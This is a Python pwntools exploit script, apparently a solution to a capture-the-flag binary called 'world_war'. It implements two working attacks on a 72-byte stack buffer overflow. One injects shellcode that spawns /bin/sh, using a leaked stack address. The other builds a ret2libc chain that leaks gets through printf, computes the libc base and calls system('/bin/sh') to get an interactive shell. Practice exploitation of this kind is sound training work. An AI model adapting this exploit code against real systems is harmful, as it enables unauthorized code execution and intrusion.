from pwn import *
import sys

class exploit:
    def shellcode(self):
        #shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
        shellcode = asm(shellcraft.sh())
        #r = remote("127.0.0.1", 8888)
        r = process('world_war')
        r.recvuntil("coordinate : ")

        buff = r.recvline()
        buff = buff[:10]
        buff = int(buff, 16)
        buff = p32(buff)

        payload = shellcode + "a" * (72-len(shellcode)) + buff
        r.sendline(payload)
        log.info("Payload: {}".format(shellcode))
        log.info("Sending payload")
        sleep(1)
        log.info("We got the shell")
        r.interactive()
    def ret2libc(self):
        binary = ELF("world_war")
        #p = remote("127.0.0.1", 8888)
        p = process("./world_war")
        hailibc = ELF("libc6_2.23-0ubuntu10_i386.so", checksec = False)     

        padding = 72
        printf_plt = p32(binary.symbols["plt.printf"])
        gets_got = p32(binary.symbols["got.gets"])
        main = p32(binary.symbols["main"])
        
        payload = "A" * padding
        payload += printf_plt
        payload += main
        payload += gets_got
        
        p.sendline(payload)
        p.recvuntil("-->We've got some Allies!\n")

        libc = u32(p.recv(4))
        log.info("Libc gets : {}".format(hex(libc)))
        base_libc = libc - hailibc.symbols["gets"]
        log.info("Libc base : {}".format(hex(base_libc)))
        system_libc = base_libc + hailibc.symbols["system"]
        log.info("Libc system : {}".format(hex(system_libc)))
        binsh_libc = base_libc + hailibc.search("/bin/sh").next()
        log.info("Libc binsh: {}".format(hex(binsh_libc)))
        
        payload = ""
        payload += "A" * padding
        payload += p32(system_libc)
        payload += "JUNK"
        payload += p32(binsh_libc)
        
        log.info("Payload: {}".format(payload))
        log.info("Sending payload")
        p.sendline(payload)
        sleep(1)
        log.info("we got the shell~")
        p.interactive()

if __name__ == "__main__":
    attack = exploit()
    if len(sys.argv) < 2:
        log.info("Argument needed!")
        log.info("Usage: python {} <shellcode/ret2libc>".format(sys.argv[0]))
        sys.exit(0)
    elif sys.argv[1] == "shellcode":
        attack.shellcode()
    elif sys.argv[1] == "ret2libc":
        attack.ret2libc()
    else:
        sys.exit(0)